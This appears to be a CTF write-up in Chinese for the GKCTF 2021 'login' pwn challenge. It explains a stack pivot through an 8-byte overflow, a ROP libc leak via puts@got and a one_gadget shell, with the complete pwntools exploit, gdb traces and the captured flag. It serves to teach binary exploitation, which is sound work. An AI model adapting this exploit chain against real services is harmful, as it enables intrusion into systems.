# GKCTF 2021 checkin/login

> GKCTF 2021 https://buuoj.cn/plugins/ctfd-matches/matches/9/    **GKCTF X DASCTF应急挑战杯**
>
> challenge name: checkin
>
> file: login, libc.so.6
>
> .i64 with comments provided
>
> point: less than 20 teams solved, higer than 900 points
>
> writeup writer: hexhex16@outlook.com    https://github.com/hex-16    thank liwl

1. 利用溢出的8B，修改rbp的值。而后经两次`leave`，rsp修改为指向name小一些的地址，而后的ret读取name所属空间上的内容，导致rip可被修改至调用`main_logic`
2. rsp修改为栈区地址后，使得`buf+0x20=name`，修改name缓冲区可控区域即可覆盖返回地址，修改至`pop edi; ret`，使得`edi = puts@got`再调用`puts`即可输出`puts`的真实地址，从而泄露libc基址(Anti ASLR)
3. 让step-2的puts为调用`main_logic`前的一个`puts`，那么泄露完`puts`真实地址后还能再执行一次`main_logic`，这时在name缓冲区上对应于返回地址的地方填入`one_gadget`，完成getshell



做题时绕的弯路：

- md5 hash算法不熟，纠结了半天md5加密部分的逻辑以及比对逻辑
- 一开始第一步返回的地址填的是`main_logic`的起始地址，即`payload = b"admin\0".ljust(0x8, b'\0') + p64(0x4018BF)`这一句用的地址是`0x4018C7`，导致buf+0x18 = name，仅有0x10 B空间构造ROP。即name: admin\0\0\0 + 浪费8B + RA + 8B可利用
- 构造rop payload时，没有想到用`main_logic`前的`call _puts`，想着还得在payload加上一个`p64(main_logic)`，然而name上可控空间较小，无法放下这么长的payload，后面liwl师傅说可以用`main_logic`调用前的`call _puts`
- 远程pwn时，`one_gadget`选取错误，本地没有可用的ld.so，无法进行本地调试。选用的`one_gadget`是试出来的。TBD: 学会从ubuntu docker中拉取对应版本的ld.so



# IDA Logic Analysis

- .text:00000000004018C7 处的函数(称为`main_logic`)，包含的是程序的主要逻辑
- 需注意的是buf长度为 0x20，输入限制为0x28，可覆盖8B。除开头的`admin\0`外为可控区域（后续会分析）
- name长度为0x20，除一开始的admin外，剩余缓冲区为可控区域，后续会利用。

```c
// 主要逻辑在这个函数里
int main_logic()  // .text:00000000004018C7
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF // buf长度为0x20B

  puts("Please Sign-in");
  putchar('>');
  read(0, s1, 0x20uLL); // name长度为0x20B
  puts("Please input u Pass");
  putchar('>');
  read(0, buf, 0x28uLL);    // 输入限制长度为8B 存在栈溢出 溢出长度为8B
  if ( strncmp(s1, "admin", 5uLL) || (unsigned int)sub_401974(buf) )//输入是否合法的判断
  {
    puts("Oh no");
    exit(0);
  }
  puts("Sign-in Success");
  return puts("BaileGeBai"); // 这里的ret只能控制rbp, 两次leave后控制rsp 修改name后空余空间 为本函数前的地址
}
```

- 在输入是否合法的判断中，会判断用户名name / s1是否为admin，并判断buf(密码)的md5值是否与一个固定的字符串相等。
- 这个固定的字符串在IDA中显示的与实际用的不同，需要根据比对逻辑，恢复成对比的顺序，然后查他的原文

```assembly
21232F297A57A5A743894A0E4A801FC3
admin # https://www.cmd5.com/ 查询结果
```

也就是说，name(s1)和buf(passwd)都得是admin才能到`main_logic`的`ret`，但是缓冲区大于`admin`长度，则输入可以是`admin\0`+`SomeThingElse`

在IDA中，`main_logic`结尾的汇编和`main`结尾的汇编如下：

```assembly
; 这个是main_logic结尾的几行汇编语句
.text:0000000000401967                 mov     edi, offset aBailegebai ; "BaileGeBai"
.text:000000000040196C                 call    _puts
.text:0000000000401971                 nop
.text:0000000000401972                 leave
.text:0000000000401973                 retn
.text:0000000000401973 ; } // starts at 4018C7
.text:0000000000401973 main_logic      endp

; 这个是main结尾的几行汇编语句
.text:00000000004018BF                 call    main_logic      ; 主要逻辑在这个函数里
.text:00000000004018C4                 nop
.text:00000000004018C5                 leave
.text:00000000004018C6                 retn
.text:00000000004018C6 ; } // starts at 401876
.text:00000000004018C6 sub_401876      endp
```

可以看到`main_logic`结尾包含一条`leave`语句，同时在`main`中`call main_logic`后紧跟着也有一条`leave`

后续分析需要了解的一些知识点：

- `leave`相等于`mov rsp, rbp; pop rbp`
- `call` 相当于 `push RIP, jmp tag`
- 栈在哪取决于rsp的值，如果能修改rsp，则可以将栈修改到可控的区域（比如本题的name后的），那么`ret`这种指令行为取决于栈上数据的指令就可以被利用起来，从而控制程序

# Step-1: hijack rsp, ret to main_logic

1. 利用溢出的8B，控制rbp的值
2. 利用连续两次的`leave`，控制rsp的值
3. 两次`leave`后`ret`时rsp已受控，则`pop rip`时用的是受控的rsp，故程序执行流程被控制

```python
# 0x401972 main_logic: leave; 0x40191C main_logic: read pw
gdb.attach(sh, "b *(0x401972)\nb *(0x40191C)\nc")

payload = b"admin\0".ljust(0x8, b'\0') + p64(0x4018BF)
sh.sendafter(">", payload)
payload = b"admin\0".ljust(0x20, b'\0') + p64(0x602400)
sh.sendafter(">", payload)
```

- `0x00007ffefbfee760`是read pw时buf基址，加载调试器后，在那个断点直接continue了。下面这个是在`main_logic`的leave断下时的寄存器、栈等

```assembly
$rsp   : 0x00007ffefbfee760  →  0x0000006e696d6461 ("admin"?) ; 此时rsp仍指向buf基址
$rbp   : 0x00007ffefbfee780  →  0x0000000000602400  →  0x0000006e696d6461 ("admin"?)
$rip   : 0x0000000000401972  →   leave 
────────────────────────────────────────────── stack ────
0x00007ffefbfee760│+0x0000: 0x0000006e696d6461 ("admin"?)        ← $rsp
0x00007ffefbfee768│+0x0008: 0x0000000000000000
0x00007ffefbfee770│+0x0010: 0x0000000000000000
0x00007ffefbfee778│+0x0018: 0x0000000000000000
0x00007ffefbfee780│+0x0020: 0x0000000000602400  →  0x0000006e696d6461 ("admin"?)         ← $rbp
0x00007ffefbfee788│+0x0028: 0x00000000004018c4  →   nop 
0x00007ffefbfee790│+0x0030: 0x0000000000400700  →   xor ebp, ebp
0x00007ffefbfee798│+0x0038: 0x0000000000000000
─────────────────────────────────────── code:x86:64 ────
     0x401967                  mov    edi, 0x401b13
     0x40196c                  call   0x400680 <puts@plt>
     0x401971                  nop    
●→   0x401972                  leave  ; main_logic: leave
     0x401973                  ret    
```

- `leave`相等于`mov rsp, rbp; pop rbp`，上方可以看到在`leave`前`rbp=0x00007ffefbfee780, rsp=0x00007ffefbfee760`，注意之前的read pw时buf基址为`0x00007ffefbfee760`
- 执行完`leave`后的下面这个输出可以看到`rbp=0x0000000000602400, rsp=0x00007ffefbfee788`
- 分析: `leave`前rsp指向buf基址`0x00007ffefbfee760`，进入函数尾声执行`leave`时，`mov rsp, rbp`使得rsp的值变为`0x00007ffefbfee780`，而后的`pop rbp`用的是前面buf溢出的8B的数据(也就是可控的8B)，同时`rsp+8`，故rsp的值在`leave`后为`0x00007ffefbfee788`。此时rsp仍未受控，是正常运行时rsp原本的值，仅仅控制了rbp的值

```assembly
$rsp   : 0x00007ffefbfee788  →  0x00000000004018c4  →   nop ;重点分析rsp变化
$rbp   : 0x0000000000602400  →  0x0000006e696d6461 ("admin"?)
$rip   : 0x0000000000401973  →   ret 
────────────────────────────────────────────── stack ────
0x00007ffefbfee788│+0x0000: 0x00000000004018c4  →   nop          ← $rsp
0x00007ffefbfee790│+0x0008: 0x0000000000400700  →   xor ebp, ebp
0x00007ffefbfee798│+0x0010: 0x0000000000000000
0x00007ffefbfee7a0│+0x0018: 0x0000000000000000
0x00007ffefbfee7a8│+0x0020: 0x0000000000401873  →   nop 
0x00007ffefbfee7b0│+0x0028: 0x00007ffefbfee7c0  →  0x0000000000401a50  →   push r15
0x00007ffefbfee7b8│+0x0030: 0x0000000000401a42  →   mov eax, 0x0
0x00007ffefbfee7c0│+0x0038: 0x0000000000401a50  →   push r15
──────────────────────────────────────── code:x86:64 ────
     0x40196c                  call   0x400680 <puts@plt>
     0x401971                  nop    
●    0x401972                  leave  ; main_logic: leave
 →   0x401973                  ret    
   ↳    0x4018c4                  nop    
        0x4018c5                  leave  ; main: leave
        0x4018c6                  ret    
```

- 从`main_logic`返回到`main`后还有一组`leave; ret;` 语句，执行`0x4018c5 leave`前rsp, rbp值与上面输出的相同，执行完`0x4018c5 leave`后如下

```assembly
$rsp   : 0x0000000000602408  →  0x00000000004018bf  →   call 0x4018c7
$rbp   : 0x6e696d6461      ; 6e:n 69:i 6d:m 64:d 61:a
$rip   : 0x00000000004018c6  →   ret 
─────────────────────────────────────────────── stack ────
0x0000000000602408│+0x0000: 0x00000000004018bf  →   call 0x4018c7        ← $rsp
0x0000000000602410│+0x0008: 0x0000000000000000
───────────────────────────────────────── code:x86:64 ────
     0x4018bf                  call   0x4018c7
     0x4018c4                  nop    
     0x4018c5                  leave  
 →   0x4018c6                  ret    
   ↳    0x4018bf                  call   0x4018c7 ; main 调用 main_logic的地方
        0x4018c4                  nop    
        0x4018c5                  leave  
        0x4018c6                  ret    
```

- 第二次`leave: mov rsp, rbp; pop rbp `时，rsp被赋值成受控的rbp的值`0x602400`，而后的`pop rbp`使得rsp+8。故最后`rsp=0x602408`
- 同时rbp的值被赋值成`0x602400`上的数据`0x6e696d6461`即`admin` (小端存储)
- 由于rsp的值现在变成了`0x602408`，即name基址+8，故如果在name+8的地方填上想要跳转到的地址，在随后的`ret`执行时就可以跳转过去。(`ret=pop rip`, pop用的就是rsp的值)
- 从上面的输出可以看到，由于在name+8的地方填入的是`0x4018bf`所以`ret`后会执行`0x4018bf  call 0x4018c7`

# Step-2: Leak libc Address

> 疑似kali20.04 libc环境有所不同，Step-2回到比赛时本地使用的ubuntu 1804继续调试

```python
payload = b"admin\0".ljust(0x8, b'\0') + p64(0x401ab3) + p64(elf.got['puts']) + p64(0x4018B5)
sh.sendafter(">", payload)
payload = b"admin\0".ljust(0x8, b'\0')
sh.sendafter(">", payload)
```

- `0x4018bf call  0x4018c7` 导致rsp+8，执行完后`rsp=0x602410`, 而后经函数序言，rbp的值被改变，read pw时使用的buf计算方法是`rbp+buf(-0x20)`，最后给`0x40191C read`的buf参数为`0x6023e0`

```assembly
─────────────────────────[ REGISTERS ]───────────────────────────────────
*RDI  0x0
*RSI  0x6023e0 (stderr) —▸ 0x7ffff7dce680 (_IO_2_1_stderr_) ◂— 0xfbad2284
*RBP  0x602400 ◂— 0x6e696d6461 /* 'admin' */
*RSP  0x6023e0 (stderr) —▸ 0x7ffff7dce680 (_IO_2_1_stderr_) ◂— 0xfbad2284
*RIP  0x40191c ◂— call   0x4006a0
────────────────────────────────────────[ DISASM ]────────────────────────────────────────
 ► 0x40191c    call   read@plt <read@plt>
        fd: 0x0
        buf: 0x6023e0 (stderr) —▸ 0x7ffff7dce680 (_IO_2_1_stderr_) ◂— 0xfbad2284 ; 注意buf数值
        nbytes: 0x28
 
   0x401921    mov    edx, 5
   0x401926    mov    esi, 0x401af7
────────────────────────────────────────[ STACK ]──────────────────────────────────
00:0000│ rax rsi rsp 0x6023e0 (stderr) —▸ 0x7ffff7dce680 (_IO_2_1_stderr_) ◂— 0xfbad2284
01:0008│             0x6023e8 ◂— 0x0
... ↓                2 skipped
04:0020│ rbp         0x602400 ◂— 0x6e696d6461 /* 'admin' */
05:0028│             0x602408 —▸ 0x401ab3 ◂— pop    rdi
06:0030│             0x602410 —▸ 0x602028 —▸ 0x7ffff7a62aa0 (puts) ◂— push   r13
07:0038│             0x602418 —▸ 0x4018b5 ◂— call   0x400680
```

- 而name(s1)基址为`0x602400`, `0x6023e0+0x20=0x602400`，故此时name基址即为函数尾声恢复rbp时用的值，name+8即为返回地址(RA)
- 故可以如此构造payload：

```python
payload = b"admin\0".ljust(0x8, b'\0') + p64(pop rdi; ret) + p64(puts@got) + p64(call puts;)
```

达到的目的：

1. `pop rdi` 控制rdi的值。pop rdi用的是栈上的值，即紧接着的填的puts函数的got表地址
2. `ret = pop rip` 令rip的值为一个`call _puts`的地址，于是程序会`puts(puts@got)`即输出`puts`函数的真实地址(puts@got上的内容)

泄露了libc某个函数的真实地址=泄露libc基址，而后就可以使用`one_gadget` getshell，所以还需控制rip一次。这里用的是`.text:4018B5   call _puts` ，这是执行`call main_logic`前输出一些字符串`call _puts`。这样程序就会随即再执行一次`main_logic`

- `pop rdi; ret` 的地址使用 ROPgadget 找到

```bash
ROPgadget --binary login  --only 'pop|ret' | grep 'rdi'
0x0000000000401ab3 : pop rdi ; ret
```

# Step-3: one_gadget

上面得到puts真实地址后，即可泄露libc基址，由于buf(password)基址比name小一些，故这次执行`main_logic`时，返回地址仍然在name缓冲区上，具体在name的哪个位置，可以调试得到。

得到`one_gadget`地址：

```bash
$ one_gadget libc.so.6 
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

- 调试时需注意read pw时buf的基址，然后就可以计算出RA的地址，然后在name对应的偏移上写上期望的RA

```python
payload = b"admin\0".ljust(0x18, b'\0') + p64(libc.address + 0xf1247)  # gdb调试 让地址放在RA处
# 具体用哪一个one_gadget不清楚 远程蒙的 0xf1247蒙对了 可用
sh.sendafter(">", payload)
payload = b"admin\0".ljust(0x8, b'\0')
sh.sendafter(">", payload)
```

- 调试时发现read pw时 `buf: 0x6023f0` ，故RA在`0x6023f0 + 0x20 + 0x8`，即在`name+0x18`的位置上，填上`one_gadget`地址，即可getshell，但是具体用哪个`one_gadget`就无法控制了，每个`one_gadget`都有一个约束条件，但是没想到有什么能够去满足约束条件的操作，只能调试一下，或者直接一个个试，看看哪个约束会被满足，就选用哪个

# Exploit

```python
from pwn import *

# v40 = "A7A5577A292F2321"  # 21232F297A57A5A7
# v41 = "C31F804A0E4A8943"  # 43894A0E4A801FC3
# "21232F297A57A5A743894A0E4A801FC3"

# one_gadget = 0x45226 # 0x4527a 0xf03a4 0xf1247
context.log_level = "DEBUG"

context.binary = './login'
sh = process("./login")  # , env={'LD_PRELOAD': './libc.so.6'}
# process(['ld.so','pwn'],env=xxx)
# sh = remote("node3.buuoj.cn", 27490)
libc = ELF("./libc.so.6")
elf = ELF("./login")
# 0x401972 main_logic: leave; 0x40191C main_logic: read pw
gdb.attach(sh, "b *(0x401972)\nb *(0x40191C)\nc")

# ===== step-1 控制rbp 进而控制rsp rip, 跳转回主要逻辑所在的函数 call 0x4018C7 的地址 0x4018BF
# 用前面的地址0x4018BF是为了让buf name地址差0x20（调试可得）多一个call = 多一个push
payload = b"admin\0".ljust(0x8, b'\0') + p64(0x4018BF)  # name 输入限制0x20
sh.sendafter(">", payload)
payload = b"admin\0".ljust(0x20, b'\0') + p64(0x602400)  # pw 输入限制0x28 # 修改rbp的值 第二次leave修改rsp的值
sh.sendafter(">", payload)

# buf 0x6023e0  +0x20 = s1 name 602400 # name + 8为返回地址
# ===== step-2 构造ROP 泄露puts真实地址 得到libc基址 并返回到main_logic里再执行一次
# payload: p64(pop rdi, ret) p64(puts@got) p64(0x4018B5) # 0x4018B5
# 如果buf偏移量并非+0x20=name, 则buf写入后不做操作可能会把name覆盖掉 导致判断时Oh no
# 0x401ab3 : pop rdi ; ret
payload = b"admin\0".ljust(0x8, b'\0') + p64(0x401ab3) + p64(elf.got['puts']) + p64(0x4018B5)
sh.sendafter(">", payload)
payload = b"admin\0".ljust(0x8, b'\0')
sh.sendafter(">", payload)

data = sh.recvuntil("GeBai\n")
addr_puts = u64(sh.recvline(keepends=False).ljust(8, b'\0'))
print("addr_puts=", hex(addr_puts))
libc.address = addr_puts - libc.sym['puts']
print("libc.address =", hex(libc.address))

# ===== step-3 ret to one_gadget RA可控原因：name可控区域包含返回地址
payload = b"admin\0".ljust(0x18, b'\0') + p64(libc.address + 0xf1247)  # gdb调试 让地址放在RA处
# 具体用哪一个one_gadget不清楚 远程蒙的 0xf1247蒙对了 可用
sh.sendafter(">", payload)
payload = b"admin\0".ljust(0x8, b'\0')
sh.sendafter(">", payload)


sh.interactive()  # then cat flag.txt at server
# flag{9c2090bf-8a0b-4785-9577-c34f070903a4}

```

- `flag{9c2090bf-8a0b-4785-9577-c34f070903a4}`

```bash
# 远程连接 成功getshell后 在server上的操作与输出：
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x29 bytes:
    b'bin\n'
    b'dev\n'
    b'etc\n'
    b'flag.txt\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'pwn\n'
bin
dev
etc
flag.txt
lib
lib32
lib64
pwn
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x2b bytes:
    b'flag{9c2090bf-8a0b-4785-9577-c34f070903a4}\n'
flag{9c2090bf-8a0b-4785-9577-c34f070903a4}
```

